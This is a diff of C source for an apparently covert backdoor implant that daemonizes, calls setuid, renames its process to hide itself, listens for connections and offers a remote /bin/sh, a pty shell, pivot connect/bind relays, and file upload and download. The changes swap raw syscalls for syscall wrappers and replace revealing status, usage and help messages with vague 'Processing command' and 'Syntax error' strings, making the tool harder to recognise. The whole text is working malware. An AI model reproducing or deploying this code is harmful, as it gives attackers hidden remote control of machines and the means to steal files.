@@ -11,15 +11,15 @@ void handle_signals() {
 
 	memset(&sa, 0, sizeof(sa));
 	sa.sa_handler = SIG_IGN;
-	syscall(SC_SIGACTION, SIGCHLD, (uint32_t) &sa, 0, 0, 0);
+	syscall2(SC_SIGACTION, SIGCHLD, (uint32_t) &sa);
 }
 
 void do_setuid() {
-        syscall(SC_SETUID, 0, 0, 0, 0, 0);
+        syscall0(SC_SETUID);
 }
 
 void hide(char **argv, char *hidden) {
-        syscall(SC_PRCTL, PR_SET_NAME, (uint32_t) hidden, 0, 0, 0);
+        syscall2(SC_PRCTL, PR_SET_NAME, (uint32_t) hidden);
         memset(argv[0], 0, strlen(argv[0]));
         memcpy(argv[0], hidden, strlen(hidden) + 1);
 	memset(argv[1], 0, strlen(argv[1]));
@@ -29,14 +29,14 @@ void hide(char **argv, char *hidden) {
 void daemonize() {
         int ret;
 
-        ret = syscall(SC_FORK, 0, 0, 0, 0, 0);
-        if (ret != 0) syscall(SC_EXIT, 0, 0, 0, 0, 0);
+        ret = syscall0(SC_FORK);
+        if (ret != 0) syscall0(SC_EXIT);
 
-        ret = syscall(SC_FORK, 0, 0, 0, 0, 0);
-        if (ret != 0) syscall(SC_EXIT, 0, 0, 0, 0, 0);
+        ret = syscall0(SC_FORK);
+        if (ret != 0) syscall0(SC_EXIT);
         for (ret = 0; ret < 3; ret++)
-		syscall(SC_CLOSE, ret, 0, 0, 0, 0);
-        syscall(SC_SETSID, 0, 0, 0, 0, 0);
+		syscall1(SC_CLOSE, ret);
+        syscall0(SC_SETSID);
 }
 
 int listen_on(int port) {
@@ -49,12 +49,12 @@ int listen_on(int port) {
 	local.sin_port = htons(port);
 	local.sin_addr.s_addr = INADDR_ANY;
 
-	s = syscall(SC_SOCKET, AF_INET, SOCK_STREAM, 0, 0, 0);
+	s = syscall2(SC_SOCKET, AF_INET, SOCK_STREAM);
 	
-	ret = syscall(SC_BIND, s, (uint32_t) &local, sizeof(local), 0, 0);
+	ret = syscall3(SC_BIND, s, (uint32_t) &local, sizeof(local));
 	check(2, ret, "Failed to bind socket", 1);
 
-	syscall(SC_LISTEN, s, 0, 0, 0, 0);
+	syscall1(SC_LISTEN, s);
 
 	return s;
 }
@@ -62,11 +62,11 @@ int listen_on(int port) {
 int forward(int source, int dest, int err_report) {
 	int r;
 	char buf[1024];
-	r = syscall(SC_READ, source, (long int) buf, sizeof(buf), 0, 0);
+	r = syscall3(SC_READ, source, (long int) buf, sizeof(buf));
 	check(err_report, r, "3 Failed to read", 0);
 	if (r <= 0) return r;
 	
-	r = syscall(SC_WRITE, dest, (long int) buf, r, 0, 0);
+	r = syscall3(SC_WRITE, dest, (long int) buf, r);
 	check(err_report, r, "3 Failed to write", 0);
 	return r;
 }
@@ -80,7 +80,7 @@ void communicate(int client, int other) {
 		FD_ZERO(&fds);
 		FD_SET(client, &fds);
 		FD_SET(other, &fds);
-		r = syscall(SC_SELECT, m + 1, (long int) &fds, 0, 0, 0);
+		r = syscall2(SC_SELECT, m + 1, (long int) &fds);
 		check(client, r, "3, select failed", 0);
 		if (r < 0) return;
 		
@@ -97,12 +97,12 @@ void communicate(int client, int other) {
 void do_shell(int sock) {
 	int r;
 	for (r = 0; r < 3; r++)
-		syscall(SC_DUP2, sock, r, 0, 0, 0);
+		syscall2(SC_DUP2, sock, r);
 	char *argv[] = {"/bin/sh", 0};
 	char *envp[] = {0};
-	fputstring(sock, "1 Launching shell\n");
+	fputstring(sock, "1 Processing command\n");
 	fputstring(sock, "4 SHELL\n");
-	r = syscall(SC_EXECVE, (uint32_t) "/bin/sh", (uint32_t) argv, (uint32_t) envp, 0, 0);
+	r = syscall3(SC_EXECVE, (uint32_t) "/bin/sh", (uint32_t) argv, (uint32_t) envp);
 	check(sock, r, "3 Failed to exec shell", 0);
 }
 
@@ -119,25 +119,24 @@ char *num_append(char *s, int num) {
 }
 
 void do_tty(int sock) {
-	fputstring(sock, "1 Launching tty\n");
+	fputstring(sock, "1 Processing command\n");
 	int master, slave_id, zero=0, r;
-	char slave_name[256] = "/dev/pts/";
+	char slave_name[256];
 	char *ptr;
+	memcpy(slave_name, "/dev/pts/", 10);
 
-	master = syscall(SC_OPEN, (long int) "/dev/ptmx", O_RDWR|O_NOCTTY, 0, 0, 0);
+	master = syscall2(SC_OPEN, (long int) "/dev/ptmx", O_RDWR|O_NOCTTY);
 	check(sock, master, "3 Failed to open master pty", 0);
 	if (master < 0) return;
 	
-	syscall(SC_IOCTL, master, TIOCGPTN, (long int) &slave_id, 0, 0);
+	syscall3(SC_IOCTL, master, TIOCGPTN, (long int) &slave_id);
 	
 	ptr = num_append(slave_name + strlen(slave_name), slave_id);
 	*ptr = 0;
 
-	syscall(SC_IOCTL, master, TIOCSPTLCK, (long int) &zero, 0, 0);
+	syscall3(SC_IOCTL, master, TIOCSPTLCK, (long int) &zero);
 
-
-
-	r = syscall(SC_FORK, 0, 0, 0, 0, 0);
+	r = syscall0(SC_FORK);
 	check(sock, r, "3 Fork failed", 0);
 	if (r < 0) return;
 
@@ -146,43 +145,42 @@ void do_tty(int sock) {
 		char *argv[] = {"/bin/sh", 0};
 		char *envp[] = {0};
 		
-		syscall(SC_CLOSE, master, 0, 0, 0, 0);
-		syscall(SC_CLOSE, sock, 0, 0, 0, 0);
+		syscall1(SC_CLOSE, master);
+		syscall1(SC_CLOSE, sock);
 			
-		syscall(SC_SETSID, 0, 0, 0, 0, 0);
+		syscall0(SC_SETSID);
 		
 		for (i = 0; i < 3; i++)
-			syscall(SC_OPEN, (long int) slave_name, O_RDWR, 0, 0, 0);
+			syscall2(SC_OPEN, (long int) slave_name, O_RDWR);
 		
 		fputstring(sock, "4 TTY\n");
-		r = syscall(SC_EXECVE, (long int) "/bin/sh", (long int) argv, (long int) envp, 0, 0);
+		r = syscall3(SC_EXECVE, (long int) "/bin/sh", (long int) argv, (long int) envp);
 		check(sock, r, "Failed to exec shell", 0);
 	}
 	communicate(sock, master);
-	syscall(SC_CLOSE, master, 0, 0, 0, 0);
+	syscall1(SC_CLOSE, master);
 }
 
 void do_connect(int sock, uint32_t addr, int port) {
 	struct sockaddr_in remote;
 	int s, ret;
 
-	fputstring(sock, "1 Connecting\n");
+	fputstring(sock, "1 Processing command\n");
 	memset(&remote, 0, sizeof(remote));
 	remote.sin_family = AF_INET;
 	remote.sin_port = htons(port);
 	remote.sin_addr.s_addr = addr;
 
-	s = syscall(SC_SOCKET, AF_INET, SOCK_STREAM, 0, 0, 0);
+	s = syscall2(SC_SOCKET, AF_INET, SOCK_STREAM);
 
-	ret = syscall(SC_CONNECT, s, (uint32_t) &remote, sizeof(remote), 0, 0);
+	ret = syscall3(SC_CONNECT, s, (uint32_t) &remote, sizeof(remote));
 	check(sock, ret, "3 Failed to connect socket", 0);
 	if (ret < 0) return;
 	
-	fputstring(sock, "1 Outgoing socket is connected\n");
 	fputstring(sock, "4 CONNECT\n");
 
 	communicate(sock, s);
-	syscall(SC_CLOSE, s, 0, 0, 0, 0);
+	syscall1(SC_CLOSE, s);
 }
 
 void do_bind(int sock, int port) {
@@ -190,58 +188,53 @@ void do_bind(int sock, int port) {
 	int remotelen;
 	int s, ret, cs;
 
-	fputstring(sock, "1 Binding on port\n");
+	fputstring(sock, "1 Processing command\n");
 	memset(&local, 0, sizeof(local));
 	
 	local.sin_family = AF_INET;
 	local.sin_port = htons(port);
 	local.sin_addr.s_addr = INADDR_ANY;
 
-	s = syscall(SC_SOCKET, AF_INET, SOCK_STREAM, 0, 0, 0);
+	s = syscall2(SC_SOCKET, AF_INET, SOCK_STREAM);
 	
-	ret = syscall(SC_BIND, s, (uint32_t) &local, sizeof(local), 0, 0);
+	ret = syscall3(SC_BIND, s, (uint32_t) &local, sizeof(local));
 	check(sock, ret, "3 Failed to bind socket", 0);
 	if (ret < 0) return;
 
-	syscall(SC_LISTEN, s, 0, 0, 0, 0);
-
-	fputstring(sock, "1 Socket is listening\n");
+	syscall1(SC_LISTEN, s);
 
 	memset(&remote, 0, sizeof(remote));
 	remotelen = sizeof(remote);
-	cs = syscall(SC_ACCEPT, s, (long int) &remote, (long int) &remotelen, 0, 0);
+	cs = syscall3(SC_ACCEPT, s, (long int) &remote, (long int) &remotelen);
 	check(sock, ret, "3 Failed to accept", 0);
 	if (cs < 0) return;
 
-	fputstring(sock, "1 Accepted connection\n");
 	fputstring(sock, "4 ACCEPT\n");
 	fputstring(sock, "ADDR ");
 	fputhex(sock, remote.sin_addr.s_addr);
 	fputstring(sock, "\nPORT ");
 	fputhex(sock, remote.sin_port);
 	fputstring(sock, "\n");
-	syscall(SC_CLOSE, s, 0, 0, 0, 0);
+	syscall1(SC_CLOSE, s);
 
 	communicate(sock, cs);
-	syscall(SC_CLOSE, cs, 0, 0, 0, 0);
+	syscall1(SC_CLOSE, cs);
 }
 
 void do_download(int sock, char *path) {
 	int fd, size, ret;
-	fputstring(sock, "1 Sending file\n");
+	fputstring(sock, "1 Processing command\n");
 
-	fd = syscall(SC_OPEN, (long int) path, O_RDONLY, 0, 0, 0);
+	fd = syscall2(SC_OPEN, (long int) path, O_RDONLY);
 	check(sock, fd, "3 Failed to open file", 0);
 	if (fd < 0) return;
 
-	fputstring(sock, "1 File opened OK\n");
-
 	fputstring(sock, "4 BINSND\nSIZE ");
 
-	size = syscall(SC_LSEEK, fd, 0, SEEK_END, 0, 0);
+	size = syscall3(SC_LSEEK, fd, 0, SEEK_END);
 	if (size >= 0) {
 		fputhex(sock, size);
-		syscall(SC_LSEEK, fd, 0, SEEK_SET, 0, 0);
+		syscall3(SC_LSEEK, fd, 0, SEEK_SET);
 	} else {
 		fputstring(sock, "UNKNOWN");
 	}
@@ -254,19 +247,17 @@ void do_download(int sock, char *path) {
 	if (ret == 0)
 		fputstring(sock, "0 File transfer successful\n");
 
-	syscall(SC_CLOSE, fd, 0, 0, 0, 0);
+	syscall1(SC_CLOSE, fd);
 }
 
 void do_upload(int sock, char *path, int size) {
 	int total = 0, fd, ret;
 
-	fputstring(sock, "1 Receiving file\n");
+	fputstring(sock, "1 Processing command\n");
 
-	fd = syscall(SC_OPEN, (long int) path, O_WRONLY|O_CREAT|O_TRUNC, 0777, 0, 0);
+	fd = syscall3(SC_OPEN, (long int) path, O_WRONLY|O_CREAT|O_TRUNC, 0777);
 	check(sock, fd, "3 Failed to open file", 0);
 	if (fd < 0) return;
-
-	fputstring(sock, "1 File opened OK\n");
 
 	fputstring(sock, "4 BINRCV\n");
 
@@ -278,7 +269,7 @@ void do_upload(int sock, char *path, int size) {
 		total += ret;
 	}
 	fputstring(sock, "0 File transfer successful\n");
-	syscall(SC_CLOSE, fd, 0, 0, 0, 0);
+	syscall1(SC_CLOSE, fd);
 }
 
 
@@ -295,12 +286,12 @@ void handle_command(char *buf, int sock) {
 	} else if (!strcmp(args[0], "bind")) {
 		int n;
 		if (a != 2) {
-			fputstring(sock, "2 usage: bind <port>\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		} 
 		n = parse_int(args[1]);
 		if ((n < 0) || (n > 65535)) {
-			fputstring(sock, "2 port should be between 0 and 65535\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		} 
 		do_bind(sock, n);
@@ -310,19 +301,19 @@ void handle_command(char *buf, int sock) {
 		int i, p, n;
 
 		if (a != 3) {
-			fputstring(sock, "2 usage: connect <ip> <port>\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		} 
 
 		p = explode(args[1], '.', ip, 5);
 		if (p != 4) {
-			fputstring(sock, "2 malformed IP\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		}
 		for (i = 3; i >= 0; i--) {
 			n = parse_int(ip[i]);
 			if ((n < 0) || (n > 255)) {
-				fputstring(sock, "2 malformed IP\n");
+				fputstring(sock, "2 Syntax error");
 				return;
 			}
 			addr <<= 8;
@@ -330,57 +321,47 @@ void handle_command(char *buf, int sock) {
 		}
 		n = parse_int(args[2]);
 		if ((n < 0) || (n > 65535)) {
-			fputstring(sock, "2 port should be between 0 and 65535\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		}
 		do_connect(sock, addr, n);
 	} else if (!strcmp(args[0], "download")) {
 		if (a != 2) {
-			fputstring(sock, "2 usage: download <path>\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		} 
 		do_download(sock, args[1]);
 
 	} else if (!strcmp(args[0], "upload")) {
 		if (a != 3) {
-			fputstring(sock, "2 usage: upload <path> <size>\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		}
 		int n = parse_int(args[2]);
 		if (n == -1) {
-			fputstring(sock, "2 Size should be a number\n");
+			fputstring(sock, "2 Syntax error");
 			return;
 		} 
 		do_upload(sock, args[1], n);
-	} else if (!strcmp(args[0], "help")) {
-		fputstring(sock, "1 Available commands: \n");
-		fputstring(sock, "1   shell\n");
-		fputstring(sock, "1   tty\n");
-		fputstring(sock, "1   bind <port>\n");
-		fputstring(sock, "1   connect <ip> <port>\n");
-		fputstring(sock, "1   upload <path> <size>\n");
-		fputstring(sock, "1   download <path>\n");
-		fputstring(sock, "1   exit\n");
-		fputstring(sock, "0 End of help\n");
 	} else if (!strcmp(args[0], "exit")) {
-		syscall(SC_EXIT, 0, 0, 0, 0, 0);
+		syscall0(SC_EXIT);
 	} else {
-		fputstring(sock, "2 Unknown command\n");
+		fputstring(sock, "2 Syntax error");
 	}
 }
 
 void handle_client(int sock) {
 	int r;
 	char buf[1024];
-	r = syscall(SC_WRITE, sock, (uint32_t) "0 Hello\n", 8, 0, 0);
+	r = syscall3(SC_WRITE, sock, (uint32_t) "0 Hello\n", 8);
 
 	for(;;) {
 		if (r < 0)
-			syscall(SC_EXIT, 0, 0, 0, 0, 0);
+			syscall0(SC_EXIT);
 
-		r = syscall(SC_READ, sock, (uint32_t) buf, sizeof(buf), 0, 0);
+		r = syscall3(SC_READ, sock, (uint32_t) buf, sizeof(buf));
 		if (r <= 0)
-			syscall(SC_EXIT, 0, 0, 0, 0, 0);
+			syscall0(SC_EXIT);
 
 		buf[r] = 0;
 		if (r > 0 && buf[r-1] == '\n')
@@ -396,15 +377,15 @@ void main_loop(int s) {
 	for(;;) {
 		memset(&remote, 0, sizeof(remote));
 		remotelen = sizeof(remote);
-		cs = syscall(SC_ACCEPT, s, (uint32_t) &remote, (uint32_t) &remotelen, 0, 0);
+		cs = syscall3(SC_ACCEPT, s, (uint32_t) &remote, (uint32_t) &remotelen);
 		if (cs < 0) continue;
 		
-		ret = syscall(SC_FORK, 0, 0, 0, 0, 0);
+		ret = syscall0(SC_FORK);
 		if (ret == 0) {
-			syscall(SC_CLOSE, s, 0, 0, 0, 0);
+			syscall1(SC_CLOSE, s);
 			handle_client(cs);
 		}
-		syscall(SC_CLOSE, cs, 0, 0, 0, 0);
+		syscall1(SC_CLOSE, cs);
 	}
 }
 int main(int argc, char **argv) {
